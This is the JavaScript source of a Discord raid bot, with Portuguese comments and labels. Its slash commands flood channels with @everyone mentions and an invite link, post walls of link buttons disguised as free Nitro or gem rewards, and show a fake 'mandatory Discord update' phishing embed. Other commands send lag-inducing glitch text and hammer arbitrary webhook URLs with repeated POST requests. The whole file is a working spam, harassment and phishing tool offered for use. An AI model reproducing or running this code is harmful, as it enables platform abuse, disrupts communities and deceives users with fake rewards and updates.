const { 
  Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, 
  EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle 
} = require('discord.js');
const https = require('https');

const INVITE_LINK = "https://discord.gg/ure7pvshFW";
const ALLOWED_USERS = ['1319018100217086022', '1421829036916736040', '1440641528321151099'];
const BOT_TYPE = process.env.BOT_TYPE || 'MAIN';
let botEnabled = (BOT_TYPE === 'MAIN');

// Função de Cooldown Dinâmico conforme solicitado
const dynamicWait = (index) => {
  if (index < 2) return 1000;      // 1-2 mensagens: 1s
  if (index < 8) return 1500;      // 3-8 mensagens: 1.5s
  return 2000;                     // 9+ mensagens: 2s
};

const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const RAID_ULTRA = `# ****CHRIST IS KING****\n# ****JOIN THE RAID****\n-# @everyone @here\nhttps://images-ext-1.discordapp.net/external/wRXhfKv8h9gdaolqa1Qehbxyy9kFLHa13mHHPIW8ubU/https/media.tenor.com/3LGBcIuftUkAAAPo/jesus-edit-edit.mp4\n**ACESSO:** ${INVITE_LINK}`;

const BUTTON_TEXTS = ["🎁 RESGATAR NITRO", "💎 COLETAR GEMAS", "🔥 ACESSO VIP", "⭐ RECOMPENSA", "🚀 BOOST GRÁTIS"];

module.exports = async (TOKEN, CLIENT_ID) => {
  const client = new Client({ intents: [GatewayIntentBits.Guilds] });
  const rest = new REST({ version: '10' }).setToken(TOKEN);

  async function registerCommands() {
    const commands = [
      new SlashCommandBuilder().setName(BOT_TYPE === 'MAIN' ? 'bot_mode2' : 'bot_mode').setDescription(`Toggle ${BOT_TYPE}`).setIntegrationTypes([1]).setContexts([0,1,2])
    ];

    if (botEnabled) {
      commands.push(
        new SlashCommandBuilder().setName('raid').setDescription('RAID AGRESSIVA (10x - Dinâmico)').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('lag_v2').setDescription('LAG FATAL (ANSI + Glitch)').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('mention_spam').setDescription('MARCAR TODOS (10x)').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('button_nuke').setDescription('PAREDE DE 100 BOTÕES').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('embed_flood').setDescription('FLOOD DE EMBEDS COLORIDOS').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('fake_update').setDescription('Aviso de atualização fake').setIntegrationTypes([1]).setContexts([0,1,2]),
        new SlashCommandBuilder().setName('webhook_atk').setDescription('Flood em Webhook').setIntegrationTypes([1]).setContexts([0,1,2])
          .addStringOption(o=>o.setName('url').setRequired(true).setDescription('URL'))
          .addStringOption(o=>o.setName('msg').setRequired(true).setDescription('Texto'))
          .addIntegerOption(o=>o.setName('qtd').setRequired(true).setDescription('Qtd')),
        new SlashCommandBuilder().setName('say').setDescription('Repete').setIntegrationTypes([1]).setContexts([0,1,2])
          .addStringOption(o=>o.setName('t').setRequired(true).setDescription('t'))
          .addIntegerOption(o=>o.setName('q').setRequired(true).setDescription('q'))
      );
    }
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands.map(c => c.toJSON()) }).catch(() => {});
  }

  client.once('ready', () => registerCommands());

  client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;
    const { commandName, options, user } = interaction;

    if (commandName === 'bot_mode' || commandName === 'bot_mode2') {
      if (!ALLOWED_USERS.includes(user.id)) return interaction.reply({ content: '❌', ephemeral: true });
      if ((BOT_TYPE === 'MAIN' && commandName === 'bot_mode2') || (BOT_TYPE === 'UPDATE' && commandName === 'bot_mode')) {
        botEnabled = !botEnabled;
        await interaction.reply({ content: `✅ **${BOT_TYPE}:** ${botEnabled ? 'ON' : 'OFF'}`, ephemeral: true });
        return registerCommands();
      }
    }

    if (!botEnabled) return;
    await interaction.reply({ content: '🔥', ephemeral: true }).catch(() => {});

    try {
      if (commandName === 'raid') {
        for(let i=0; i<10; i++) {
          await interaction.followUp({ content: RAID_ULTRA }).catch(() => {});
          await wait(dynamicWait(i));
        }
      }

      if (commandName === 'mention_spam') {
        for(let i=0; i<10; i++) {
          await interaction.followUp({ content: "@everyone @here **S̶Y̶S̶T̶E̶M̶ ̶H̶A̶C̶K̶E̶D̶**\n" + INVITE_LINK }).catch(() => {});
          await wait(dynamicWait(i));
        }
      }

      if (commandName === 'say') {
        const t = options.getString('t'), q = options.getInteger('q');
        for(let i=0; i<q; i++) {
          await interaction.followUp({ content: t }).catch(() => {});
          await wait(dynamicWait(i));
        }
      }

      if (commandName === 'button_nuke') {
        for (let m = 0; m < 4; m++) {
          const rows = [];
          for (let i = 0; i < 5; i++) {
            const row = new ActionRowBuilder();
            for (let j = 0; j < 5; j++) {
              row.addComponents(new ButtonBuilder().setLabel(BUTTON_TEXTS[j%5]).setStyle(ButtonStyle.Link).setURL(INVITE_LINK));
            }
            rows.push(row);
          }
          await interaction.followUp({ content: "**GIFT READY!**", components: rows }).catch(() => {});
          await wait(dynamicWait(m));
        }
      }

      if (commandName === 'lag_v2') {
        const glitch = "\u030d\u030e\u0304\u0305\u033f\u0311\u0306\u0310\u0352\u035b\u0323\u0324\u0330".repeat(40);
        const wall = ("```ansi\n\u001b[1;31m" + glitch + "\n```").repeat(5);
        await interaction.followUp({ content: wall.slice(0, 1999) }).catch(() => {});
      }

      if (commandName === 'embed_flood') {
        for (let i = 0; i < 8; i++) {
          const e = new EmbedBuilder().setColor(Math.floor(Math.random()*16777215)).setTitle("⚠️ SECURITY BREACH").setDescription(INVITE_LINK);
          await interaction.followUp({ embeds: [e] }).catch(() => {});
          await wait(dynamicWait(i));
        }
      }

      if (commandName === 'fake_update') {
        const e = new EmbedBuilder().setColor(0x5865F2).setTitle('📢 System Update').setDescription(`Uma nova versão do **𝗗𝗶𝘀𝗰𝗼𝗿𝗱** foi detectada.\n\nRealize a atualização obrigatória.\n\n**Status:** \`Crítico\``);
        const r = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Atualizar Agora').setStyle(ButtonStyle.Link).setURL(INVITE_LINK));
        await interaction.followUp({ embeds: [e], components: [r] }).catch(() => {});
      }

      if (commandName === 'webhook_atk') {
        const url = options.getString('url'), msg = options.getString('msg'), qty = options.getInteger('qtd');
        for (let i = 0; i < qty; i++) {
          const data = JSON.stringify({ content: msg });
          const req = https.request(url, { method: 'POST', headers: { 'Content-Type': 'application/json' } });
          req.write(data); req.end();
          if (i % 5 === 0) await wait(500);
        }
      }

    } catch (err) {}
  });

  client.login(TOKEN).catch(() => {});
};

process.on('unhandledRejection', () => {});
process.on('uncaughtException', () => {});

